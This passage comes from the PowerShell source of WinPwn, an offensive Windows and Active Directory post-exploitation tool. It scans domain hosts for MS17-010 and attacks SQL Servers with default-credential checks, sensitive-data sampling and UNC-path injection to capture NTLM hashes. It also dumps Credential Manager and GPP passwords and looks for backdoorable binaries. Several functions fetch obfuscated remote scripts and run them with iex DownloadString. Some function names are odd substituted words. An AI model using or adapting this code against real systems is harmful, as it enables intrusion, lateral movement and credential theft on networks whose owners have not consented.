            Write-Host -ForegroundColor Yellow "Found an existing Server list, using this one instead of generating a new one!"
            $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Servers.txt"
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
          $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
            $ActiveServers = $ActiveServers.dnshostname
            if(!$consoleoutput){$ActiveServers >> "$currentPath\DomainRecon\Windows_Servers.txt"}
        }
    foreach ($acserver in $ActiveServers)
        {
      try{
          if (Scan-MS17-10 -target $acserver)
                {
                  Write-Host -ForegroundColor Yellow "Found vulnerable Server - $acserver. Just Pwn this system!"
                    if(!$consoleoutput){echo "$acserver" >> "$currentPath\Vulnerabilities\MS17-10_VulnerableServers.txt"}else{Write-Host -ForegroundColor Red "$acserver is vulnerable to MS17-10!"}
                }
      }catch{Write-Host "Got an error"}
        }
    }
    else
    {
        if(Test-Path -Path "$currentPath\DomainRecon\Windows_Systems.txt")
        {
            Write-Host -ForegroundColor Yellow "Found an existing Windows system list, using this one instead of generating a new one!"
            $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Systems.txt"
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Searching every windows system in the domain, this can take a while depending on the domain size'
          $ActiveServers = breviaries -Ping -OperatingSystem "Windows*"
            $ActiveServers = $ActiveServers.dnshostname
            if(!$consoleoutput){$ActiveServers >> "$currentPath\DomainRecon\Windows_Systems.txt"}
        }
    foreach ($acserver in $ActiveServers)
        {
      try{
          if (Scan-MS17-10 -target $acserver)
                {
                  Write-Host -ForegroundColor Yellow 'Found vulnerable System - $acserver. Just Pwn it!'
                    if(!$consoleoutput){echo "$acserver" >> "$currentPath\Vulnerabilities\MS17-10_VulnerableSystems.txt"}else{Write-Host -ForegroundColor Red "$acserver is vulnerable to MS17-10!"}
                }
      }catch{Write-Host "Got an error"}
        }
    }

}

function PowerSQL
{
  <#
        .DESCRIPTION
        AD-Search for SQL-Servers. Login for current user tests. Default Credential Testing, UNC-PATH Injection SMB Hash extraction. Original Scipt from https://github.com/NetSPI/
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Domain Recon / Lateral Movement Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    Write-Host -ForegroundColor Yellow 'Searching for SQL Server instances in the domain:'
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/PowerUpSQL.ps1')
    if(!$consoleoutput){Get-SQLInstanceDomain -Verbose >> "$currentPath\DomainRecon\SQLServers.txt"}
    
    Write-Host -ForegroundColor Yellow 'Checking login with the current user Account:'
    $Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"} 
    if(!$consoleoutput){$Targets >> "$currentPath\DomainRecon\SQLServer_Accessible.txt"}else{Write-Host -ForegroundColor Yellow '-------> Accessible SQL Servers';$Targets}
    if(!$consoleoutput){$Targets.Instance >> "$currentPath\DomainRecon\SQLServer_AccessibleInstances.txt"}else{Write-Host -ForegroundColor Yellow '-------> Accessible Instances';$Targets.Instance}
    
    Write-Host -ForegroundColor Yellow 'Checking Default Credentials for all Instances:'
    if(!$consoleoutput){Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose >> "$currentPath\Vulnerabilities\SQLServer_DefaultLogin.txt"}else{Write-Host -ForegroundColor Yellow '-------> Default Logins';Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose}
    
    Write-Host -ForegroundColor Yellow 'Dumping Information and Auditing all accesible Databases:'
    foreach ($line in $Targets.Instance)
    {
        if(!$consoleoutput){
            Get-SQLServerInfo -Verbose -Instance $line >> "$currentPath\DomainRecon\SQLServer_Accessible_GeneralInformation.txt"
            Invoke-SQLDumpInfo -Verbose -Instance $line >> "$currentPath\DomainRecon\SQLServer_Accessible_DumpInformation.txt"
            Invoke-SQLAudit -Verbose -Instance $line >> "$currentPath\Vulnerabilities\SQLServer_Accessible_Audit_AllServers.txt"
          Get-SQLServerLinkCrawl -verbose -instance "$line" >> "$currentPath\Vulnerabilities\SQLServerLinks_Pot_LateralMovement.txt"
            mkdir "$currentPath\DomainRecon\SQLInfoDumps"
            $Targets | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword "password,pass,credit,ssn,pwd" -SampleSize 2 -ValidateCC -NoDefaults >> "$currentPath\DomainRecon\SQLServer_Accessible_PotentialSensitiveData.txt" 
        }
        else
        {
            Write-Host -ForegroundColor Yellow '-------> SQL Login Info'
            Get-SQLServerInfo -Verbose -Instance $line
            Invoke-SQLDumpInfo -Verbose -Instance $line
          $SQLComputerName = $Targets.Computername
            Write-Host -ForegroundColor Yellow '-------> SQL Audit'
            Invoke-SQLAudit -Verbose -Instance $line 
            Write-Host -ForegroundColor Yellow '-------> Potential Lateral Movement over LinkCrawl'
          Get-SQLServerLinkCrawl -verbose -instance "$line"
        }
    }
    if(!$consoleoutput){
        Write-Host -ForegroundColor Yellow 'Moving CSV-Files to SQLInfoDumps folder:'
        move *.csv "$currentPath\DomainRecon\SQLInfoDumps\"
        $uncpath = "no"
        if (!$noninteractive){$uncpath = Read-Host -Prompt 'Execute UNC-Path Injection tests for accesible SQL Servers to gather some Netntlmv2 Hashes? (yes/no)'}
        if ($uncpath -eq "yes" -or $uncpath -eq "y" -or $uncpath -eq "Yes" -or $uncpath -eq "Y")
        {
            $responder = Read-Host -Prompt 'Do you have Responder.py running on another machine in this network? (If not we can start inveigh) - (yes/no)'
            if ($responder -eq "yes" -or $responder -eq "y" -or $responder -eq "Yes" -or $responder -eq "Y")
            {
                $smbip = Read-Host -Prompt 'Please enter the IP-Address of the hash capturing Network Interface:'
              Invoke-SQLUncPathInjection -Verbose -CaptureIp $smbip
            }
            else
            {
                $smbip = Get-currentIP
                Inveigh
              Invoke-SQLUncPathInjection -Verbose -CaptureIp $smbip.IPv4Address.IPAddress
            }    
        }
    }
    #TODO Else Exploit Function
    # XP_Cmdshell functions follow - maybe.
	      
}

function Get-currentIP
{
  <#
        .DESCRIPTION
        Gets the current active IP-Address configuration.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Domain Recon / Lateral Movement Phase
    $IPaddress = Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}
    return $IPaddress
}

function SharpHoundMenu
{
  @'

             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|

   --> SharpHoundMenu

'@
    do
    {
        Write-Host "================ WinPwn ================"
        Write-Host -ForegroundColor Green '1. Run SharpHound for the current domain!'
        Write-Host -ForegroundColor Green '2. Run SharpHound for another domain! '
        Write-Host -ForegroundColor Green '3. Run SharpHound for all trusted domains! '
        Write-Host -ForegroundColor Green '4. Go back '
        Write-Host "================ WinPwn ================"
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'

        Switch ($masterquestion) 
        {
             1{Sharphound -noninteractive}
             2{SharpHound}
             3{SharpHound -alltrustedomains}
       }
    }
  While ($masterquestion -ne 4)

}

function Sharphound
{
  <#
        .DESCRIPTION
        Downloads Sharphound.exe and collects All AD-Information for Bloodhound https://github.com/BloodHoundAD
        Author: @S3cur3Th1sSh1t, @Luemmelsec
        License: BSD 3-Clause
    #>
    #Domain Recon / Lateral Movement Phase
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [Switch]
        $alltrustedomains   
    )

    
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpHound4.ps1')
    Write-Host -ForegroundColor Yellow 'Running Sharphound Collector: '
    
    if ($noninteractive)
    {
        Invoke-Sharphound4 -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
    }
    elseif($alltrustedomains)
    {
        IEX($admodule)
        $TrustedDomains = (Get-ADForest).Domains
        foreach ($TrustedDomain in $TrustedDomains)
        {
            Invoke-Sharphound4 -command "-c All,GPOLocalGroup -d $TrustedDomain --ZipFileName $TrustedDomain.zip --OutputDirectory $currentPath"
        }
        
    }
    else
    {
        $otherdomain = Read-Host -Prompt 'Pleas enter the domain to collect data from: '
        Invoke-Sharphound4 -command "-c All,GPOLocalGroup -d $otherdomain --OutputDirectory $currentPath"
    }
}

function oldchecks
{
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    # Sherlock script, P0werUp Scipt, Get-GPP Scripts from p0werspl0it + credential manager dump
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/locksher.ps1')
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/UpPower.ps1')
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/GPpass.ps1')
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/AutoGP.ps1')
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/DumpWCM.ps1')
    if(!$consoleoutput){
        Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
        Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
        if(Test-Path $currentPath\Exploitation\WCMCredentials.txt){ $out = Get-Content $currentPath\Exploitation\WCMCredentials.txt; $out}

        Write-Host -ForegroundColor Yellow 'Getting Local Privilege Escalation possibilities:'

        Write-Host -ForegroundColor Yellow 'Getting GPPPasswords:'
        amazon >> $currentPath\Vulnerabilities\GPP_Auto.txt
        if(Test-Path $currentPath\Vulnerabilities\GPP_Auto.txt){ $out = Get-Content $currentPath\Vulnerabilities\GPP_Auto.txt; $out}
        Shockley >> $currentPath\Vulnerabilities\GPP_Passwords.txt
        if(Test-Path $currentPath\Vulnerabilities\GPP_Passwords.txt){ $out = Get-Content $currentPath\Vulnerabilities\GPP_Passwords.txt; $out}

        Write-Host -ForegroundColor Yellow 'Looking for Local Privilege Escalation possibilities:'
        try{    
        families >> $currentPath\LocalPrivEsc\All_Localchecks.txt
        $out = Get-Content $currentPath\LocalPrivEsc\All_Localchecks.txt; $out}
        catch{}

        Write-Host -ForegroundColor Yellow 'Looking for MS-Exploits on this local system for Privesc:'
        try{
        proportioned >> $currentPath\Vulnerabilities\Sherlock_Vulns.txt
        if(Test-Path $currentPath\Vulnerabilities\Sherlock_Vulns.txt){ $out = Get-Content $currentPath\Vulnerabilities\Sherlock_Vulns.txt; $out}}
        catch{}
    }
    else
    {
        Write-Host -ForegroundColor Yellow '-------> WCMDump:'
        Invoke-WCMDump
        Write-Host -ForegroundColor Yellow '-------> Getting Local Privilege Escalation possibilities:'

        Write-Host -ForegroundColor Yellow '-------> Getting GPPPasswords:'
        amazon 
        Shockley 
        
        Write-Host -ForegroundColor Yellow '-------> Looking for Local Privilege Escalation possibilities:'
        try{    
        families
        } 
        catch{}

        Write-Host -ForegroundColor Yellow '-------> Looking for MS-Exploits on this local system for Privesc:'
        try{
        proportioned
        }catch{}

    }
}

function itm4nprivesc
{
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    # Stolen and obfuscated from https://github.com/itm4n/PrivescCheck
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/obfuscatedps/Invoke-Privesc.ps1')
    if(!$consoleoutput)
    {
        Invoke-PrivescCheck -Extended -Report PrivescCheck -Format CSV,HTML,TXT
        Move-Item $currentPath\PrivescCheck* "$currentPath\LocalPrivEsc\"
    }
    else
    {
        Write-Host -ForegroundColor Yellow '-------> Invoke-Privesc Checks'
        Invoke-PrivescCheck -Extended
    }
}

function otherchecks
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    
    $groups = 'Users,Everyone,Authenticated Users'
    $arguments = $groups.Split(",")
    $whoami = whoami
    
    if(!$consoleoutput){wmic qfe get InstalledOn | Sort-Object { $_ -as [datetime] } | Select -Last 1 >> $currentPath\LocalPrivEsc\LastPatchDate.txt}else{Write-Host -ForegroundColor Yellow '-------> Last Patch Date';wmic qfe get InstalledOn | Sort-Object { $_ -as [datetime] } | Select -Last 1}
    
    # Stolen somewhere.

    if(!$consoleoutput){

        Write "Checking if SCCM is installed - installers are run with SYSTEM privileges, many are vulnerable to DLL Sideloading:"
        $result = $null
        $result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
        if ($result) { $result >> $currentPath\LocalPrivEsc\SCCM_DLLSiteloading.txt }
        else { Write "Not Installed." }
        
        Write "Checking privileges - rotten potato:"
        $result = $null
        $result = (whoami /priv | findstr /i /C:"SeImpersonatePrivilege" /C:"SeAssignPrimaryPrivilege" /C:"SeTcbPrivilege" /C:"SeBackupPrivilege" /C:"SeRestorePrivilege" /C:"SeCreateTokenPrivilege" /C:"SeLoadDriverPrivilege" /C:"SeTakeOwnershipPrivilege" /C:"SeDebugPrivilege" 2> $null) | Out-String
        if ($result) { Write $result; $result >> $currentPath\LocalPrivEsc\RottenPotatoVulnerable.txt} else { Write "User privileges do not allow for rotten potato exploit." }
        
        Write "System32 directory permissions - backdoor windows binaries:"
        $result = $null
        $result = (Get-Acl C:\Windows\system32).Access | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on C:\Windows\system32" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result >> $currentPath\LocalPrivEsc\System32directoryWritePermissions.txt } else { Write "Permissions set on System32 directory are correct for all groups." }
        
        Write "System32 files and directories permissions - backdoor windows binaries:"
        $result = $null
        $result = Get-ChildItem C:\Windows\system32 -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result >> $currentPath\LocalPrivEsc\System32fileWritePermissions.txt } else { Write "Permissions set on System32 files and directories are correct for all groups." }
        
        Write "Program Files directory permissions - backdoor windows binaries:"
        $result = $null
        $result = (Get-Acl "$env:ProgramFiles").Access | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on C:\Windows\system32" } } }
        $result += (Get-Acl ${env:ProgramFiles(x86)}).Access | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on C:\Windows\system32" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result >> $currentPath\LocalPrivEsc\ProgramDirectoryWritePermissions.txt } else { Write "Permissions set on Program Files directory are correct for all groups." }
        
        Write "Program Files files and directories permissions - backdoor windows binaries:"
        $result = $null
        $result = Get-ChildItem "$env:ProgramFiles" -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        $result += Get-ChildItem ${env:ProgramFiles(x86)} -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique ; $result >> $currentPath\LocalPrivEsc\ProgramBinaryWritePermissions.txt } else { Write "Permissions set on Program Files files and directories are correct for all groups." }
            
        Write "ProgramData files and directories permissions - backdoor windows binaries:"
        $result = $null
        $result = Get-ChildItem "$env:ProgramData" -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result >> $currentPath\LocalPrivEsc\ProgramDataDirectoryPermissions.txt} else { Write "Permissions set on ProgramData files and directories are correct for all groups." }
    
        Write "Scheduled process binary permissions - backdoor binary:"
        $result = $null
        $result = schtasks /query /fo LIST /V | findstr "\\" | findstr "\." | % { Trap { Continue } $o = $_.Split(" "); $obj = $o[30..($o.Length-1)] -join (" "); If ($obj -like '"*"*') { $o = $obj.split('"')[1] } ElseIf ($obj -like '* -*') { $o = $obj.split('-')[0] } ElseIf ($obj -like '* /*') { $o = $obj.split('/')[0] } Else { $o = $obj }; If ($o -like '*%*%*') { $var = $o.split('%')[1]; $out = resolve($var); $o = $o.replace("%$var%",$out) }; (Get-Acl $o 2> $null).Access } | ForEach-Object { Trap { Continue } ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique ; $result >> $currentPath\LocalPrivEsc\ScheduledProcessBinaryPermissions.txt } else { Write "Permissions set on scheduled binaries are correct for all groups." }
            
        
        Write "Scheduled process directory permissions - try DLL injection:"
        $result = $null
        $result = schtasks /query /fo LIST /V | findstr "\\" | findstr "\." | % { Trap { Continue } $o = $_.Split(" "); $obj = $o[30..($o.Length-1)] -join (" "); If ($obj -like '"*"*') { $o = $obj.split('"')[1] } ElseIf ($obj -like '* -*') { $o = $obj.split('-')[0] } ElseIf ($obj -like '* /*') { $o = $obj.split('/')[0] } Else { $o = $obj }; If ($o -like '*%*%*') { $var = $o.split('%')[1]; $out = resolve($var); $o = $o.replace("%$var%",$out) }; $obj = $o.Split("\"); $o = $obj[0..($obj.Length-2)] -join ("\"); (Get-Acl $o 2> $null).Access } | ForEach-Object { Trap { Continue } ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result >> $currentPath\LocalPrivEsc\ScheduledProcessDirectoryPermissions.txt } else { Write "Permissions set on scheduled binary directories are correct for all groups." }
                
        
        Write "Loaded DLLs permissions - backdoor DLL:"
        $result = $null
        $result = ForEach ($item in (Get-WmiObject -Class CIM_ProcessExecutable)) { [wmi]"$($item.Antecedent)" | Where-Object {$_.Extension -eq 'dll'} | Select Name | ForEach-Object { $o = $_.Name; (Get-Acl $o 2> $null).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result >> $currentPath\LocalPrivEsc\WriteDLLPermission.txt } else { Write "Permissions set on loaded DLLs are correct for all groups." }
     }
     else
     {
        Write "-------> Checking if SCCM is installed - installers are run with SYSTEM privileges, many are vulnerable to DLL Sideloading:"
        $result = $null
        $result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
        if ($result) { $result }
        else { Write "Not Installed." }
        
        Write "-------> Checking privileges - rotten potato:"
        $result = $null
        $result = (whoami /priv | findstr /i /C:"SeImpersonatePrivilege" /C:"SeAssignPrimaryPrivilege" /C:"SeTcbPrivilege" /C:"SeBackupPrivilege" /C:"SeRestorePrivilege" /C:"SeCreateTokenPrivilege" /C:"SeLoadDriverPrivilege" /C:"SeTakeOwnershipPrivilege" /C:"SeDebugPrivilege" 2> $null) | Out-String
        if ($result) { Write $result; $result } else { Write "User privileges do not allow for rotten potato exploit." }
        
        Write "-------> System32 directory permissions - backdoor windows binaries:"
        $result = $null
        $result = (Get-Acl C:\Windows\system32).Access | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on C:\Windows\system32" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result } else { Write "Permissions set on System32 directory are correct for all groups." }
        
        Write "-------> System32 files and directories permissions - backdoor windows binaries:"
        $result = $null
        $result = Get-ChildItem C:\Windows\system32 -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result } else { Write "Permissions set on System32 files and directories are correct for all groups." }
        
        Write "-------> Program Files directory permissions - backdoor windows binaries:"
        $result = $null
        $result = (Get-Acl "$env:ProgramFiles").Access | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on C:\Windows\system32" } } }
        $result += (Get-Acl ${env:ProgramFiles(x86)}).Access | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on C:\Windows\system32" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result } else { Write "Permissions set on Program Files directory are correct for all groups." }
        
        Write "-------> Program Files files and directories permissions - backdoor windows binaries:"
        $result = $null
        $result = Get-ChildItem "$env:ProgramFiles" -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        $result += Get-ChildItem ${env:ProgramFiles(x86)} -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique ; $result } else { Write "Permissions set on Program Files files and directories are correct for all groups." }
            
        Write "-------> ProgramData files and directories permissions - backdoor windows binaries:"
        $result = $null
        $result = Get-ChildItem "$env:ProgramData" -Recurse 2> $null | ForEach-Object { Trap { Continue }; $o = $_.FullName; (Get-Acl $_.FullName).Access } | ForEach-Object { ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result } else { Write "Permissions set on ProgramData files and directories are correct for all groups." }
    
        Write "-------> Scheduled process binary permissions - backdoor binary:"
        $result = $null
        $result = schtasks /query /fo LIST /V | findstr "\\" | findstr "\." | % { Trap { Continue } $o = $_.Split(" "); $obj = $o[30..($o.Length-1)] -join (" "); If ($obj -like '"*"*') { $o = $obj.split('"')[1] } ElseIf ($obj -like '* -*') { $o = $obj.split('-')[0] } ElseIf ($obj -like '* /*') { $o = $obj.split('/')[0] } Else { $o = $obj }; If ($o -like '*%*%*') { $var = $o.split('%')[1]; $out = resolve($var); $o = $o.replace("%$var%",$out) }; (Get-Acl $o 2> $null).Access } | ForEach-Object { Trap { Continue } ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique ; $result } else { Write "Permissions set on scheduled binaries are correct for all groups." }
            
        
        Write "-------> Scheduled process directory permissions - try DLL injection:"
        $result = $null
        $result = schtasks /query /fo LIST /V | findstr "\\" | findstr "\." | % { Trap { Continue } $o = $_.Split(" "); $obj = $o[30..($o.Length-1)] -join (" "); If ($obj -like '"*"*') { $o = $obj.split('"')[1] } ElseIf ($obj -like '* -*') { $o = $obj.split('-')[0] } ElseIf ($obj -like '* /*') { $o = $obj.split('/')[0] } Else { $o = $obj }; If ($o -like '*%*%*') { $var = $o.split('%')[1]; $out = resolve($var); $o = $o.replace("%$var%",$out) }; $obj = $o.Split("\"); $o = $obj[0..($obj.Length-2)] -join ("\"); (Get-Acl $o 2> $null).Access } | ForEach-Object { Trap { Continue } ForEach ($arg in $arguments + $whoami.Split('\')[1]) { if ($_.FileSystemRights.tostring() -match "AppendData|ChangePermissions|CreateDirectories|CreateFiles|FullControl|Modify|TakeOwnership|Write|WriteData|268435456|-536805376|1073741824" -and $_.IdentityReference.tostring() -like "*\$arg") { $rights = $_.FileSystemRights.tostring(); Write "Group: $arg, Permissions: $rights on $o" } } }
        if ($result -ne $null) { Write $result | Sort -Unique; $result } else { Write "Permissions set on scheduled binary directories are correct for all groups." }
                
        
